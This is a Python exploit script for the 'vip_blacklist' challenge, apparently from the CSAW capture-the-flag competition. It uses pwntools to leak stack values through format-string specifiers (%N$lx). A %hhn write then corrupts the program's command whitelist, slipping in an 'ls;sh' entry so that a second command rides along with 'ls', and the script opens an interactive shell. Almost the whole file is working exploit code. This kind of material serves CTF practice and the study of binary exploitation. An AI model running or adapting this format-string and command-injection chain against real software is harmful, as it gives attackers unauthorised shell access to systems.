#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./vip_blacklist")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("./")
# ld = ptr.ELF("./")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("vip-blacklist.ctf.csaw.io", 9999)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else: return x


def dump():
    with open("./dump.txt", "w") as f:
        for i in range(210):
            io = connect()
            io.sendlineafter("Commands: clear exit ls", f"#%{i + 1}$lx#")
            io.recvuntil("#")
            io.close()
            leak = int(io.recvuntil("#").strip(b"#"), 16)
            dump = f"leak{i + 1}: {hex(leak)}\n"
            f.write(dump)
    return


def main():
    io = connect()

    def send(payload: bytes):
        if len(payload) > 0x20:
            ptr.logger.error("payload too long")
        elif len(payload) == 0x20:
            io.sendafter("Commands: clear exit ls", payload)
        else:
            io.sendlineafter("Commands: clear exit ls", payload)
        return

    def leak(offset: int) -> int:
        if len(str(offset)) > 2:
            ptr.logger.error("offset too long")
            exit(1)
        if len(str(offset)) == 2:
            send(f"#%{offset}$lx#".encode())
            io.recvuntil("Executing:")
            io.recvuntil("#")
            leak = io.recvuntil("#").strip(b"#")
            return int(leak, 16)
        else:
            send(f"#%{offset}$lx##".encode())
            io.recvuntil("Executing:")
            io.recvuntil("#")
            leak = io.recvuntil("##").strip(b"##")
            return int(leak, 16)

    payload = b""
    payload += b"%8$hhn"
    send(payload)

    send(b"\x00")

    # whitelist: 0x555555558010
    new_command = b"queue\x00"  # queue
    new_command += b"clear\x00"  # clear
    new_command += b"exit\x00\x00"  # exit
    new_command += b"ls;sh\x00"  # ls -> ls;sh
    io.sendline(new_command)
    send(b"ls;sh")
    io.interactive()

    return


if __name__ == "__main__":
    # dump()
    main()
